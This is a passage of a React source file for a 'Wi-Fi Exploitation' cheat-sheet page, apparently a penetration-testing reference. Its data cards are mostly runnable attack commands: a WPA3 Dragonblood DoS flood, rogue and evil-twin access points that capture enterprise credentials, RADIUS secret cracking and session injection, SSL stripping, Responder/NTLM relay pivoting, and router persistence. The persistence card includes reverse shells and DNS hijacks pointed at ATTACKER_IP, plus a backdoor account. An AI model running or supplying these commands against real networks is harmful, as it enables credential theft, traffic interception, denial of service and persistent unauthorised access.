      'Collect at least 1000 samples per password prefix candidate to achieve statistical significance',
      'Feed timing output to the analysis script to identify the most likely password prefix group',
      'Use narrowed candidate list as input to hashcat for offline verification: hashcat -m 22000 -a 0 handshake.hc22000 candidates.txt',
      'Run the anti-clogging DoS — flood SAE Commits from randomised spoofed MACs to exhaust AP CPU: python3 dragonslayer.py wlan0mon <BSSID> --dos',
    ],
    commands: [
      {
        title: 'Dragonblood — timing attack, DoS, and candidate cracking',
        code: `# Clone dragonslayer (official Dragonblood PoC — Mathy Vanhoef)
git clone https://github.com/vanhoefm/dragonslayer
cd dragonslayer

# Repo structure:
# build.sh                  — builds patched hostapd/wpa_supplicant
# client.conf               — wpa_supplicant config for the attacking client
# dragonslayer-client.sh    — runs the attacking wpa_supplicant against a real AP
# dragonslayer-server.sh    — runs a rogue hostapd AP to attack a connecting client
# hostapd.conf              — hostapd config for the rogue server-side AP
# hostapd.eap_user          — EAP user database for the rogue AP

# Step 1: Build the patched hostapd and wpa_supplicant binaries
bash build.sh

# Prerequisites: monitor mode + injection-capable adapter (e.g., Alfa AWUS036ACH)
airmon-ng check kill
airmon-ng start wlan0

# Step 2: Edit client.conf — set the target SSID and key_mgmt=SAE
# nano client.conf

# Step 3a: AP-side attack — attack the real AP as a malicious SAE client
bash dragonslayer-client.sh wlan0mon AA:BB:CC:DD:EE:FF
# Sends SAE Commit frames and measures AP response latency
# Outputs timing data used to narrow the password candidate list

# Step 3b: Client-side attack — run rogue hostapd AP, wait for client to connect
bash dragonslayer-server.sh wlan1
# When a WPA3 client connects, captures SAE exchange for timing analysis

# Step 4: Anti-clogging DoS — flood AP with SAE Commits from spoofed MACs
bash dragonslayer-client.sh wlan0mon AA:BB:CC:DD:EE:FF --dos
# AP must validate anti-clogging tokens for every unique MAC
# Result: CPU/memory exhaustion — legitimate clients cannot authenticate

# Verify DoS impact
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
# During DoS: #Data stops increasing; clients show no AUTH

# Step 5: Offline cracking with narrowed candidates (pair with downgraded WPA2 handshake)
hashcat -m 22000 -a 0 downgrade.hc22000 candidates.txt

# Reference: https://papers.mathyvanhoef.com/dragonblood.pdf`
      }
    ]
  },
  {
    id: 'rogue-ap',
    title: 'Rogue AP Attack — WPA Enterprise (802.1X)',
    subtitle: 'Create malicious AP to capture EAP credentials from WPA Enterprise networks',
    tags: ['hostapd-wpe', 'EAP', '802.1X', 'credential capture', 'RADIUS', 'MS-CHAPv2'],
    accentColor: 'purple',
    overview: 'WPA Enterprise (802.1X) replaces the shared PSK with per-user credentials authenticated via RADIUS and EAP. The most common inner method is EAP-PEAP/MS-CHAPv2, where the client sends its domain credentials inside a TLS tunnel. A rogue AP using hostapd-wpe (Wireless Pwnage Edition) presents a self-signed TLS certificate and terminates the EAP tunnel — capturing the MS-CHAPv2 challenge/response which can be cracked offline with hashcat -m 5500 or relayed for NTLM authentication.',
    steps: [
      'Generate self-signed TLS certificates for the rogue RADIUS server: openssl req -x509 -newkey rsa:2048 -out server.crt -keyout server.key -nodes -days 365',
      'Configure hostapd-wpe with the target SSID, WPA-EAP key management, and certificate paths',
      'Configure the EAP user file to accept all EAP methods and capture inner credentials',
      'Start the rogue AP: sudo hostapd-wpe hostapd-wpe.conf',
      'Deauth clients from the legitimate AP to trigger reconnection: aireplay-ng -0 5 -a <REAL_AP_BSSID> wlan0mon',
      'Monitor hostapd-wpe console output for captured MS-CHAPv2 challenge/response hashes',
      'Crack the captured NTChallengeResponse: hashcat -m 5500 captured_hash.txt rockyou.txt',
    ],
    commands: [
      {
        title: 'Rogue AP EAP credential capture with hostapd-wpe',
        code: `# Install hostapd-wpe
apt-get install hostapd-wpe
# Or build from source:
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
cd hostapd-wpe && patch -p1 < hostapd-wpe.patch && cd hostapd-2.10 && make

# Generate self-signed RADIUS server certificate
openssl req -x509 -newkey rsa:2048 \
  -out /etc/hostapd-wpe/certs/server.crt \
  -keyout /etc/hostapd-wpe/certs/server.key \
  -nodes -days 365 \
  -subj "/C=US/ST=CA/O=Corp/CN=radius.corp.local"

# Configure hostapd-wpe
cat > hostapd-wpe.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=CorporateWiFi
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee80211w=0
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=hostapd-wpe
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.crt
server_cert=/etc/hostapd-wpe/certs/server.crt
private_key=/etc/hostapd-wpe/certs/server.key
EOF

# Start rogue AP
sudo hostapd-wpe hostapd-wpe.conf
# Captured credentials appear in console:
# username: jsmith
# NT: a5e6...  (NTChallengeResponse)
# challenge: 4c3e...

# Deauth clients from real AP to trigger reconnect
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack captured MS-CHAPv2 hash (NTChallengeResponse)
hashcat -m 5500 "jsmith::::a5e6...:4c3e..." rockyou.txt
# -m 5500 = NetNTLMv1 / MS-CHAPv2`
      }
    ]
  },
  {
    id: 'eap-relay',
    title: 'EAP Relay Attack',
    subtitle: 'Relay authentication between rogue AP and legitimate RADIUS to gain MITM position without cracking credentials',
    tags: ['EAP relay', '802.1X relay', 'RADIUS relay', 'hostapd', 'pass-through'],
    accentColor: 'purple',
    overview: 'Rather than terminating the EAP exchange and cracking credentials offline, an EAP relay attack transparently forwards the 802.1X authentication between the victim client and the legitimate RADIUS server. If successful, the client authenticates through the rogue AP using real credentials — giving the attacker a fully authenticated MITM position on the wireless segment without ever knowing the password. This is particularly effective when EAP-TLS is used (mutual certificate auth), where offline cracking is not an option.',
    steps: [
      'Identify the legitimate RADIUS server IP and shared secret (from AP config, network scan, or sniffed from management traffic)',
      'Configure hostapd to act as a pass-through AP, forwarding RADIUS to the real server IP',
      'Assign the rogue AP the same SSID as the target enterprise network on the same or adjacent channel',
      'Start the rogue AP and DHCP server (dnsmasq) to hand out IPs to connecting clients',
      'Deauth clients from the real AP: aireplay-ng -0 5 -a <REAL_AP_BSSID> wlan0mon',
      'Monitor: when a client connects, hostapd forwards EAP to the real RADIUS — if auth succeeds, client is connected through the rogue AP',
      'Capture all client traffic: tcpdump -i wlan1 -w relay_capture.pcap',
    ],
    commands: [
      {
        title: 'EAP relay setup with hostapd RADIUS proxy',
        code: `# Configure hostapd as EAP relay (forwards RADIUS to real server)
cat > hostapd-relay.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=CorporateWiFi
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee80211w=0
# Forward to real RADIUS server
auth_server_addr=192.168.1.50     # Real RADIUS server IP
auth_server_port=1812
auth_server_shared_secret=corp_secret
acct_server_addr=192.168.1.50
acct_server_port=1813
acct_server_shared_secret=corp_secret
EOF

# Configure DHCP for connecting clients
cat > dnsmasq-relay.conf << 'EOF'
interface=wlan1
dhcp-range=10.10.99.50,10.10.99.150,12h
dhcp-option=3,10.10.99.1
dhcp-option=6,8.8.8.8
listen-address=10.10.99.1
EOF
ifconfig wlan1 10.10.99.1 netmask 255.255.255.0

# Enable IP forwarding and NAT
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan1 -j ACCEPT

# Start rogue AP and DHCP
hostapd hostapd-relay.conf &
dnsmasq -C dnsmasq-relay.conf &

# Deauth clients from real AP
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Capture all relayed traffic
tcpdump -i wlan1 -w relay_capture.pcap

# Monitor RADIUS relay traffic (ports 1812/1813)
tcpdump -i eth0 "port 1812 or port 1813" -nn`
      }
    ]
  },
  {
    id: 'radius',
    title: 'RADIUS Server Exploitation',
    subtitle: 'Dictionary attack on the RADIUS shared secret and CoA injection for session hijacking',
    tags: ['RADIUS', 'shared secret', 'radclient', 'freeradius-wpe', 'CoA', 'nmap'],
    accentColor: 'purple',
    overview: 'RADIUS uses a shared secret between the NAS (AP) and RADIUS server to sign and encrypt authentication packets (MD5-based). If the shared secret is weak or default, it can be recovered by offline dictionary attack against captured RADIUS Access-Request/Challenge exchanges. With the shared secret known, an attacker can forge Change-of-Authorization (CoA) or Disconnect-Message packets to terminate arbitrary user sessions, or replay/modify authentication packets to bypass access controls.',
    steps: [
      'Capture RADIUS traffic between the AP and RADIUS server: tcpdump -i eth0 "udp port 1812" -w radius.pcap',
      'Extract RADIUS Access-Request packets for offline shared secret cracking: use freeradius-wpe crackers or radius-crack',
      'Dictionary attack the shared secret using the captured authenticator + response attribute: radius-crack -f rockyou.txt radius.pcap',
      'Verify recovered shared secret with radtest: radtest testuser testpass 192.168.1.50 0 <shared_secret>',
      'With valid shared secret: forge a Disconnect-Message to kick a specific user session',
      'With valid shared secret: forge a CoA to modify a session\'s attributes (e.g., change VLAN, bandwidth)',
    ],
    commands: [
      {
        title: 'RADIUS shared secret cracking and CoA injection',
        code: `# Capture RADIUS traffic from network (requires access to AP-RADIUS segment)
tcpdump -i eth0 "udp port 1812 or udp port 1813" -w radius.pcap

# Crack RADIUS shared secret (offline — against captured Access-Request/Response)
# Using freeradius-wpe radius-crack utility
radius-crack -f /usr/share/wordlists/rockyou.txt radius.pcap
# Alternatively: hashcat does not natively crack RADIUS, use custom scripts
# or nmap's radius-crack script:
nmap -p 1812 --script radius-brute \
  --script-args userdb=users.txt,passdb=passes.txt,radius.shared_secret=testing123 \
  192.168.1.50

# Test candidate shared secrets with radtest
radtest testuser wrongpass 192.168.1.50 0 <candidate_secret>
# Access-Reject but no MD5 error = wrong secret
# Access-Reject with valid packet format = correct secret, wrong credentials

# Verify correct secret
radtest validuser validpass 192.168.1.50 0 <correct_secret>
# Should return: Received Access-Accept

# CoA — disconnect a specific session (requires correct shared secret)
cat > disconnect.txt << 'EOF'
User-Name = "jsmith"
Acct-Session-Id = "0x1A2B3C4D"
NAS-IP-Address = 192.168.1.1
EOF
radclient -x 192.168.1.50:3799 disconnect disconnect.txt <shared_secret>
# Response: Disconnect-ACK = session terminated

# CoA — change VLAN for an active session
cat > coa_vlan.txt << 'EOF'
User-Name = "jsmith"
Acct-Session-Id = "0x1A2B3C4D"
Tunnel-Type = VLAN
Tunnel-Medium-Type = IEEE-802
Tunnel-Private-Group-Id = "999"
EOF
radclient -x 192.168.1.50:3799 coa coa_vlan.txt <shared_secret>`
      }
    ]
  },
  {
    id: 'evil-twin',
    title: 'Evil Twin / Rogue AP Setup',
    subtitle: 'Create a fake AP to impersonate legitimate networks and capture traffic',
    tags: ['evil twin', 'rogue AP', 'hostapd', 'dnsmasq', 'SSID spoofing', 'MITM'],
    accentColor: 'pink',
    overview: 'An evil twin AP broadcasts the same SSID (and optionally BSSID-spoofed) as a legitimate network. Clients that roam or are deauthed from the real AP may auto-connect to the evil twin, placing the attacker transparently in the path of all their traffic. The rogue AP uses hostapd to create the wireless interface, dnsmasq for DHCP, and iptables for NAT forwarding — the setup takes under 2 minutes on a Kali-based system.',
    steps: [
      'Gather target SSID, BSSID, channel, and security type from airodump-ng reconnaissance',
      'Configure hostapd with matching SSID and the appropriate wpa/wpa2 settings on a second wireless adapter',
      'Assign a gateway IP to the AP interface and configure dnsmasq for DHCP on that subnet',
      'Enable IP forwarding and NAT via iptables so clients have internet connectivity (increases trust)',
      'Start hostapd and dnsmasq: hostapd -B hostapd_evil.conf && dnsmasq -C dnsmasq.conf',
      'Deauth clients from real AP: aireplay-ng -0 10 -a <REAL_BSSID> wlan0mon',
      'Verify clients receive DHCP leases: tail -f /var/log/syslog | grep dnsmasq',
      'Deploy MITM tools to intercept traffic: mitmproxy --mode transparent or arpspoof',
    ],
    commands: [
      {
        title: 'Evil twin rogue AP — hostapd + dnsmasq + NAT',
        code: `# Step 1: Write hostapd config (match target SSID exactly)
cat > hostapd_evil.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TargetNetwork
channel=6
hw_mode=g
wmm_enabled=1
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=SamePasswordAsReal
EOF

# Step 2: Write dnsmasq config (DHCP server)
cat > dnsmasq_evil.conf << 'EOF'
interface=wlan1
dhcp-range=192.168.99.50,192.168.99.150,12h
dhcp-option=3,192.168.99.1
dhcp-option=6,8.8.8.8
listen-address=192.168.99.1
log-dhcp
EOF

# Step 3: Assign gateway IP to AP interface
ip addr add 192.168.99.1/24 dev wlan1

# Step 4: Enable NAT and IP forwarding
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT

# Step 5: Start AP and DHCP
hostapd -B hostapd_evil.conf
dnsmasq -C dnsmasq_evil.conf

# Step 6: Deauth clients from real AP (wlan0mon in monitor mode)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Step 7: Confirm clients are connecting
journalctl -u dnsmasq -f | grep DHCPACK

# Step 8: Intercept HTTP/S traffic
mitmproxy --mode transparent --listen-port 8080
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j REDIRECT --to-port 8080`
      }
    ]
  },
  {
    id: 'interception',
    title: 'Traffic Interception — Packet Sniffing & Analysis',
    subtitle: 'Capture and analyse Wi-Fi traffic for credentials, tokens, and sensitive data',
    tags: ['tcpdump', 'tshark', 'wireshark', 'packet analysis', 'credential extraction'],
    accentColor: 'pink',
    overview: 'Once in a MITM position (evil twin or ARP spoof), all client traffic passes through the attacker\'s machine in plaintext (for HTTP) or encrypted (for HTTPS). tcpdump and tshark capture this at the packet level. Filtering for cleartext protocols (HTTP, DNS, SMTP, FTP, Telnet) and POST request bodies is the primary method for extracting credentials, session tokens, and sensitive file transfers without disrupting the connection.',
    steps: [
      'Start a full capture on the AP interface: tcpdump -i wlan1 -w full_capture.pcap',
      'In parallel, run a live filter for HTTP POST bodies (credentials): tshark -i wlan1 -Y "http.request.method==POST" -T fields -e http.file_data',
      'Filter DNS queries to build a picture of browsing activity: tshark -i wlan1 -Y "dns.qry.name" -T fields -e dns.qry.name',
      'Extract cleartext credentials from FTP/Telnet/SMTP with tshark protocol filters',
      'Run strings against the capture file to find credentials in any protocol: strings full_capture.pcap | grep -iE "password|token|Authorization"',
      'Open full_capture.pcap in Wireshark and use "Follow TCP Stream" on interesting connections for context',
    ],
    commands: [
      {
        title: 'Packet capture and credential extraction',
        code: `# Full capture on AP interface (background)
tcpdump -i wlan1 -nn -w full_capture.pcap &

# Live HTTP POST body extraction (form submissions, API calls)
tshark -i wlan1 -Y "http.request.method==POST" \
  -T fields -e frame.time -e ip.src -e http.host -e http.file_data

# Live DNS query monitoring (browsing activity)
tshark -i wlan1 -Y "dns.flags.response==0" \
  -T fields -e ip.src -e dns.qry.name 2>/dev/null

# Extract all HTTP GET requests (shows visited URLs)
tshark -r full_capture.pcap -Y "http.request.method==GET" \
  -T fields -e ip.src -e http.host -e http.request.uri

# Extract HTTP Basic Auth credentials (base64 encoded)
tshark -r full_capture.pcap -Y "http.authorization" \
  -T fields -e http.authorization | base64 -d 2>/dev/null

# Extract FTP credentials
tshark -r full_capture.pcap -Y "ftp.request.command==USER or ftp.request.command==PASS" \
  -T fields -e ip.src -e ftp.request.command -e ftp.request.arg

# Extract Telnet/SMTP cleartext
tshark -r full_capture.pcap -Y "tcp.port==23 or tcp.port==25" \
  -T fields -e frame.time -e ip.src -e tcp.payload | xxd | strings

# Grep capture for any credential patterns
strings full_capture.pcap | grep -iE "password=|passwd=|token=|Authorization: Bearer" | head -30

# Open in Wireshark for interactive analysis
wireshark full_capture.pcap &`
      }
    ]
  },
  {
    id: 'ssl-strip',
    title: 'SSL/TLS Stripping & MITM Attack',
    subtitle: 'Downgrade HTTPS to HTTP to intercept encrypted credentials and session tokens',
    tags: ['sslstrip', 'mitmproxy', 'HSTS bypass', 'SSL downgrade', 'iptables redirect'],
    accentColor: 'pink',
    overview: 'sslstrip intercepts HTTP 301/302 redirects to HTTPS and rewrites them as HTTP, keeping the connection to the server as HTTPS while serving the client over HTTP. The client believes it is on a secure site, but all data (including credentials and session cookies) is transmitted in plaintext to the attacker. This requires an existing MITM position (evil twin or ARP spoof). HSTS defeats sslstrip for preloaded domains, but custom intranets, corporate portals, and non-preloaded sites remain vulnerable.',
    steps: [
      'Establish a MITM position via evil twin AP or ARP spoofing: arpspoof -i wlan1 -t <client_ip> <gateway_ip>',
      'Enable IP forwarding: sysctl -w net.ipv4.ip_forward=1',
      'Redirect all port 80 and 443 traffic to sslstrip\'s listening port with iptables',
      'Start sslstrip in kill-mode: sslstrip -k -l 10000 -w sslstrip.log',
      'Monitor sslstrip.log for intercepted credentials and session cookies',
      'Optionally use mitmproxy for richer inspection and modification of HTTP/S traffic: mitmproxy --mode transparent',
    ],
    commands: [
      {
        title: 'SSL stripping with sslstrip and mitmproxy',
        code: `# Requires existing MITM position (evil twin or ARP spoof)

# ARP spoof to MITM a specific client (alternative to evil twin)
arpspoof -i wlan1 -t 192.168.99.105 192.168.99.1 &   # Tell client we are gateway
arpspoof -i wlan1 -t 192.168.99.1 192.168.99.105 &   # Tell gateway we are client

# Enable IP forwarding
sysctl -w net.ipv4.ip_forward=1

# Redirect port 80 and 443 to sslstrip
iptables -t nat -A PREROUTING -p tcp --dport 80  -j REDIRECT --to-port 10000
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 10000

# Start sslstrip
sslstrip -k -l 10000 -w sslstrip.log
# -k = kill flag (strip HSTS headers), -l = listen port, -w = log file

# Monitor captured data live
tail -f sslstrip.log | grep -iE "POST|password|username|token|cookie"

# Alternative: mitmproxy (full HTTPS MITM with cert spoofing)
mitmproxy --mode transparent --listen-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 80  -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
# Victims must accept mitmproxy's CA cert (or it was pre-installed)

# mitmproxy filter for POST data
mitmproxy --mode transparent -k --set "flow_detail=3"
# Press f in UI → filter: "~m POST"

# Cleanup iptables when done
iptables -t nat -F PREROUTING`
      }
    ]
  },
  {
    id: 'internal-recon',
    title: 'Internal Network Reconnaissance Post-Wi-Fi Access',
    subtitle: 'Enumerate internal network after gaining Wi-Fi access',
    tags: ['arp-scan', 'nmap', 'netdiscover', 'SMB', 'LDAP', 'service discovery'],
    accentColor: 'yellow',
    overview: 'Gaining Wi-Fi access is equivalent to being on the physical internal network — you receive an internal DHCP lease and can reach all hosts on the LAN. The first phase is passive host discovery via ARP, then active scanning with nmap to identify open ports and services. Key targets are domain controllers (ports 88, 389, 445), file servers (445), databases (1433, 3306), and management interfaces (RDP 3389, WinRM 5985).',
    steps: [
      'Identify your IP and subnet from the DHCP lease: ip addr show wlan1 or ip route',
      'Passive ARP discovery across the subnet: arp-scan -I wlan1 -l',
      'Nmap ping sweep to find live hosts: nmap -sn <subnet>/24 -oG hosts_up.txt',
      'Fast port scan on all live hosts: nmap -p- --min-rate 1000 -iL hosts_up.txt -oG open_ports.txt',
      'Service and version scan on interesting open ports: nmap -sV -sC -p <ports> <target_IPs>',
      'Identify domain controllers (ports 53, 88, 389, 445, 636): nmap -p 53,88,389,445,636 <subnet>/24',
      'Enumerate SMB shares on discovered hosts: smbclient -L //<IP> -N',
    ],
    commands: [
      {
        title: 'Internal network discovery and service enumeration',
        code: `# Check assigned IP and subnet
ip addr show wlan1
ip route show

# Passive ARP sweep (finds all hosts without sending ICMP)
arp-scan -I wlan1 -l
# Output: IP | MAC | Vendor

# Nmap ping sweep
nmap -sn 192.168.1.0/24 -oG hosts_up.txt
grep "Up" hosts_up.txt | awk '{print $2}' > live_hosts.txt

# Fast full-port scan on all live hosts
nmap -p- --min-rate 1500 -T4 -iL live_hosts.txt -oN full_portscan.txt

# Targeted service scan on interesting hosts
nmap -sV -sC -p 22,80,135,139,443,445,3389,5985,8080 -iL live_hosts.txt -oN services.txt

# Identify domain controllers
nmap -p 53,88,389,445,636,3268,3269 192.168.1.0/24 -oG dc_scan.txt
grep "88/open" dc_scan.txt   # Kerberos = DC

# Enumerate SMB shares (unauthenticated)
crackmapexec smb 192.168.1.0/24 --shares -u '' -p ''

# LDAP query (unauthenticated base enumeration)
ldapsearch -x -H ldap://192.168.1.10 -s base namingContexts

# Check for open NFS shares
showmount -e 192.168.1.0/24 2>/dev/null`
      }
    ]
  },
  {
    id: 'wifi-pivot',
    title: 'Network Pivoting via Wi-Fi Access',
    subtitle: 'Use Wi-Fi access as entry point for credential theft, lateral movement, and internal escalation',
    tags: ['responder', 'ntlmrelayx', 'crackmapexec', 'LLMNR', 'SMB relay', 'lateral movement'],
    accentColor: 'yellow',
    overview: 'Wi-Fi access provides a foothold on the internal LAN equivalent to a physical network connection. From this position, the same AD attack techniques apply: LLMNR/NBT-NS poisoning with Responder captures NTLMv2 hashes from clients resolving non-existent hostnames; SMB relay forwards captured authentication to other hosts; and domain enumeration via BloodHound maps paths to Domain Admin. The Wi-Fi segment is often less scrutinised than wired infrastructure.',
    steps: [
      'Start Responder on the Wi-Fi interface to poison LLMNR/NBT-NS/mDNS and capture NTLMv2 hashes: responder -I wlan1 -v',
      'Crack captured NTLMv2 hashes offline: hashcat -m 5600 captured.txt rockyou.txt',
      'Run ntlmrelayx to relay captured NTLM auth to SMB on high-value targets: ntlmrelayx.py -tf targets.txt -smb2support',
      'Enumerate domain users, groups, and computers with crackmapexec: crackmapexec smb 192.168.1.10 -u user -p password --users',
      'Run BloodHound ingestor to map AD attack paths: bloodhound-python -u user -p password -d corp.local -c All -ns 192.168.1.10',
      'Use crackmapexec to spray recovered credentials across all hosts: crackmapexec smb 192.168.1.0/24 -u user -p password',
      'Use evil-winrm or psexec to access compromised hosts with valid credentials',
    ],
    commands: [
      {
        title: 'Wi-Fi foothold to internal AD compromise',
        code: `# Step 1: LLMNR/NBT-NS poisoning — capture NTLMv2 hashes
responder -I wlan1 -v
# Poisons broadcast name resolution — captures NTLMv2 from any misconfigured client
# Hashes saved to /usr/share/responder/logs/

# Step 2: Crack captured NTLMv2 hashes
hashcat -m 5600 /usr/share/responder/logs/NTLMv2-*.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Step 3: SMB relay (when SMB signing is disabled)
# First: disable Responder's SMB/HTTP to avoid conflict
sed -i 's/SMB = On/SMB = Off/;s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
# Write relay targets (hosts without SMB signing)
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets_no_signing.txt
# Start relay
ntlmrelayx.py -tf targets_no_signing.txt -smb2support
# Trigger auth (e.g., Responder, printer coercion, etc.)

# Step 4: Domain user enumeration with recovered creds
crackmapexec smb 192.168.1.10 -u jsmith -p Password123 --users
crackmapexec smb 192.168.1.10 -u jsmith -p Password123 --groups
crackmapexec smb 192.168.1.10 -u jsmith -p Password123 --shares

# Step 5: BloodHound collection
bloodhound-python -u jsmith -p Password123 \
  -d corp.local -ns 192.168.1.10 -c All --zip
# Import .zip into BloodHound GUI → "Shortest Paths to Domain Admin"

# Step 6: Credential spray across subnet
crackmapexec smb 192.168.1.0/24 -u jsmith -p Password123

# Step 7: Shell on compromised host
evil-winrm -i 192.168.1.25 -u jsmith -p Password123
# or
impacket-psexec corp.local/jsmith:Password123@192.168.1.25`
      }
    ]
  },
  {
    id: 'wifi-persistence',
    title: 'Wi-Fi Persistence & Backdoors',
    subtitle: 'Maintain long-term access via rogue APs and AP firmware persistence',
    tags: ['persistence', 'cron', 'reverse shell', 'dnsmasq hijack', 'hostapd', 'AP backdoor'],
    accentColor: 'yellow',
    overview: 'If the attacker gains shell access to the AP itself (via SSH using default credentials, CVE, or from a compromised internal host), persistence can be established directly in the router firmware. This provides long-term traffic interception, DNS hijacking, and a re-entry point even if internal passwords are reset. Separately, a persistent rogue AP on an external device (Raspberry Pi, laptop) can maintain Wi-Fi access independently of any AP compromise.',
    steps: [
      'SSH into the AP using default credentials or credentials recovered from SNMP/web admin: ssh admin@192.168.1.1',
      'Create a backdoor user account on the AP\'s Linux system: adduser backdoor',
      'Install a reverse shell cron job that calls back to attacker on reboot: crontab -e → @reboot /tmp/.svc &',
      'Modify dnsmasq config on the AP to redirect specific hostnames to attacker IP for credential harvesting',
      'For a standalone rogue AP: create a systemd service or rc.local entry on the attacker machine to auto-start hostapd on boot',
      'Monitor the persistent rogue AP by forwarding captured DHCP/DNS logs to a remote server',
    ],
    commands: [
      {
        title: 'AP firmware backdoor and persistent rogue AP',
        code: `# === AP firmware backdoor (requires shell on router) ===

# SSH to AP with recovered credentials
ssh admin@192.168.1.1

# Add backdoor local user
adduser backdoor
# Set password and add to sudoers/wheel group

# Persistent reverse shell via cron (calls back on every reboot)
crontab -e
# Add: @reboot sleep 30 && nc -e /bin/sh ATTACKER_IP 4444 &
# or bash variant:
echo '@reboot bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | crontab -

# DNS hijacking via dnsmasq (redirect internal hostnames to attacker)
echo "address=/corp-portal.corp.local/ATTACKER_IP" >> /etc/dnsmasq.conf
echo "address=/vpn.corp.local/ATTACKER_IP" >> /etc/dnsmasq.conf
/etc/init.d/dnsmasq restart

# === Persistent rogue AP on attacker device (Raspberry Pi / laptop) ===

# Create systemd service for persistent hostapd
cat > /etc/systemd/system/rogue-ap.service << 'EOF'
[Unit]
Description=Persistent Rogue AP
After=network.target

[Service]
ExecStartPre=/bin/sleep 15
ExecStart=/usr/sbin/hostapd /etc/hostapd/rogue.conf
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable rogue-ap.service
systemctl start rogue-ap.service

# Persistent dnsmasq for DHCP
systemctl enable dnsmasq
systemctl start dnsmasq

# Forward DHCP/DNS logs to remote collection server
rsyslog conf: *.* @ATTACKER_LOG_SERVER:514`
      }
    ]
  },
];

const colorOptions = [
  { value: 'cyan', name: 'Cyan' },
  { value: 'green', name: 'Green' },
  { value: 'red', name: 'Red' },
  { value: 'purple', name: 'Purple' },
  { value: 'orange', name: 'Orange' },
  { value: 'pink', name: 'Pink' },
  { value: 'blue', name: 'Blue' },
  { value: 'yellow', name: 'Yellow' },
];
const colorPreview = { cyan:'bg-cyan-500', green:'bg-emerald-500', red:'bg-red-500', purple:'bg-purple-500', orange:'bg-orange-500', pink:'bg-pink-500', blue:'bg-blue-500', yellow:'bg-yellow-500' };
const headerColorMap = { cyan:'text-cyan-400 border-cyan-500/30', green:'text-emerald-400 border-emerald-500/30', red:'text-red-400 border-red-500/30', purple:'text-purple-400 border-purple-500/30', orange:'text-orange-400 border-orange-500/30', pink:'text-pink-400 border-pink-500/30', blue:'text-blue-400 border-blue-500/30', yellow:'text-yellow-400 border-yellow-500/30' };

export default function WiFi() {
  const [columns, setColumns] = useState(initialMapColumns);
  const [modalStep, setModalStep] = useState(null);
  const [columnName, setColumnName] = useState('');
  const [selectedColor, setSelectedColor] = useState('cyan');
  const [addingTopicCol, setAddingTopicCol] = useState(null);
  const [topicTitle, setTopicTitle] = useState('');
  const [topicTags, setTopicTags] = useState('');
  const [customCards, setCustomCards] = useState([]);
  const [cardModalOpen, setCardModalOpen] = useState(false);

  const handleAddColumnStart = () => setModalStep('name');
  const handleNameSubmit = () => { if (columnName.trim()) setModalStep('color'); };
  const handleColorSubmit = () => { setColumns([...columns, { header: columnName.toUpperCase(), color: selectedColor, nodes: [] }]); setModalStep(null); setSelectedColor('cyan'); setColumnName(''); };
  const handleDeleteColumn = (i) => setColumns(columns.filter((_, idx) => idx !== i));
  const handleAddTopic = (colIndex) => {
    if (topicTitle.trim()) {
      const updated = [...columns];
      updated[colIndex].nodes.push({ title: topicTitle, subtitle: 'Add details here', tags: topicTags.split(',').map(t => t.trim()).filter(t => t) });
      setColumns(updated); setAddingTopicCol(null); setTopicTitle(''); setTopicTags('');
    }
  };
  const handleDeleteTopic = (colIndex, nodeIndex) => { const updated = [...columns]; updated[colIndex].nodes.splice(nodeIndex, 1); setColumns(updated); };
  const handleAddCard = (card) => setCustomCards([...customCards, card]);
  const handleDeleteCard = (id) => setCustomCards(customCards.filter(c => c.id !== id));
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };

  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-cyan-400">Wi-Fi</span><span className="text-slate-200"> Exploitation</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Recon • WPA2 • WPS • WPA3 • Enterprise • Rogue AP • MITM • Pivoting</p>
      </div>

      <div className="overflow-x-auto pb-4">
        <div className="inline-flex gap-4 min-w-max">
          {columns.map((col, i) => {
            const color = col.color || 'cyan';
            return (
              <div key={i} className="flex flex-col gap-2 min-w-[180px] max-w-[200px] relative">
                <div className={`text-center py-2 border-b-2 mb-2 ${headerColorMap[color]} flex items-center justify-between px-2`}>
                  <span className="font-mono text-[11px] font-bold tracking-[0.2em] uppercase flex-1">{col.header}</span>
